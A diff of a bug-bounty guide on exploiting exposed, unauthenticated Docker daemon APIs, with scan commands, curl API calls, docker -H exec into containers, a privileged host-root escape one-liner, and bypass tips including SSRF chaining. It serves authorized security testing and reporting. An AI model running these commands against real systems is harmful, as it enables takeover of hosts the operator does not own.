@@ -1,41 +1,80 @@
-# Docker API unauthorized RCE
-- Docker is an open-source platform for developers and other IT professionals to help build, ship, and run distributed applications.
-the docker daemon (dockerd) provides an API service used for remote control of docker service the default daemon listen on Unix /var/run/docker.sock and when bound to a public interface can be used by an attacker to compromise container system due to lack of default authentication
+# Docker API Unauthorized RCE (Exposed docker.sock / docker daemon)
 
-## Background concept:
+Docker is an open-source platform for building, shipping, and running distributed applications. The Docker daemon (`dockerd`) exposes an API used to remotely control containers; by default it listens on the Unix socket `/var/run/docker.sock`, but when bound to a public interface **with no authentication** anyone can enumerate, create, and exec into containers. This is a Critical finding: full control of the container platform usually means root on the host (mount the host filesystem and escape).
 
-- The host is running docker: daemon bound to the external interface with no access control or authentication
-- Attacker uses docker API function to enumerate manage and control the container service the attacker is able to control existing deployed container or create another one.
-- Docker API provides JSON response containing the output of command issued.
-- Enumerating docker API services
-- By default, the Docker host remote API listens on ports 2375 / 2376 and has no authentication. If the port is not blocked, docker host APIs can be accessed over the public internet.
+## Hunting Checklist
 
+1. Scan for the daemon ports — remote API defaults to **2375** (unencrypted) / **2376** (TLS):
+
+```bash
+nmap -Pn -p 2375 <IP>
+nmap -sV -p 2375,2376 <IP>
+nmap -p- <IP>        # full scan when the port may be moved
 ```
-nmap IP:2375/2376
-nmap -p- IP
-nmap -Pn -p 2375 IP
-nmap -sV -p 2375 IP
+
+2. Confirm it's Docker — request the root or `/version` and read the JSON:
+
+```http
+GET /version HTTP/1.1
+Host: <IP>:2375
 ```
-- To confirm that the docker is service is running on the target we can give the string in the browser and check the response
-ex: `https://IP:2375`
-- we will receive a response something like this
-`{"message":"page not found"}`
-- and to confirm the version details we can use this
-`https://IP:2375/version`
 
-- The command used to exploit
+Typical confirmations: a `{"message":"page not found"}`-style JSON response, and `/version` returning `ApiVersion`, `KernelVersion`, `OSType`, etc.
 
-- This command is used to get all the information about the docker container
-`docker -H IP:2375 info`
+3. Enumerate the platform via the API or the docker CLI.
+4. Verify the severity with a *read-only* PoC first (`info`, `ps`); only run a container if scope allows, and clean it up immediately.
+5. Also hunt non-port-80 web exposure of the same API (`https://<IP>:2375/...`) and check whether the target is in your bug bounty scope (cloud IPs may belong to the provider, not the program — confirm ownership before reporting).
 
-- List all the running containers
-`docker -H IP:2375 ps`
+## Test Cases & Examples
 
-- List all the stopped containers
-`docker -H IP:2375 ps -a`
+CLI against the exposed daemon:
 
-- Docker command for RCE
-`docker -H IP:2375 exec -it container_name /bin/bash`
+```bash
+# All information about the docker host/daemon
+docker -H <IP>:2375 info
 
-## Contributor:
-- [N3T_hunt3r](https://twitter.com/N3T_hunt3r)
+# List running containers
+docker -H <IP>:2375 ps
+
+# List all (including stopped) containers
+docker -H <IP>:2375 ps -a
+
+# Exec into a container -> RCE inside it
+docker -H <IP>:2375 exec -it <container_name> /bin/bash
+```
+
+Raw API equivalents (`curl` works because the API is plain HTTP + JSON):
+
+```bash
+curl -s http://<IP>:2375/version
+curl -s http://<IP>:2375/containers/json
+curl -s http://<IP>:2375/images/json
+```
+
+Illustrative escalation (only where explicitly authorized): launching a privileged container that mounts the host root:
+
+```bash
+docker -H <IP>:2375 run -v /:/host --rm -it alpine chroot /host sh
+```
+
+## Bypass Techniques
+
+- If **2376 (TLS)** is open but you have no client cert, the daemon may still accept unencrypted requests on 2375, or be misconfigured (`--tlsverify` missing) — test both.
+- Some deployments proxy the API behind HTTP on 80/8080 or a path rewrite; fuzz for `/containers/json` on ordinary web ports.
+- IPv6/internal exposure: if a request from the outside is filtered, the API may still bind `0.0.0.0` internally — chain with SSRF to `http://127.0.0.1:2375/`.
+
+## Tools & Resources
+
+- `docker` CLI with `-H`, `nmap`, `curl`
+- [Docker daemon security docs](https://docs.docker.com/engine/security/) — official background on `docker.sock` vs TCP binding and TLS requirements
+- Docker API reference: `GET /version`, `/containers/json`, `/exec`, etc. (standard daemon endpoints)
+
+## Report Tips
+
+- Frame impact precisely: unauthenticated remote API = full container control; demonstrate host-root risk with one benign read (`/version`, `info`) rather than leaving shells around.
+- Include a cleanup note (containers/images you created were removed) — triage teams check for persistence.
+- If the IP is cloud-provider infrastructure, confirm ownership/scope before reporting to avoid invalid "external system" closures.
+
+## Contributor
+
+[N3T_hunt3r](https://twitter.com/N3T_hunt3r)
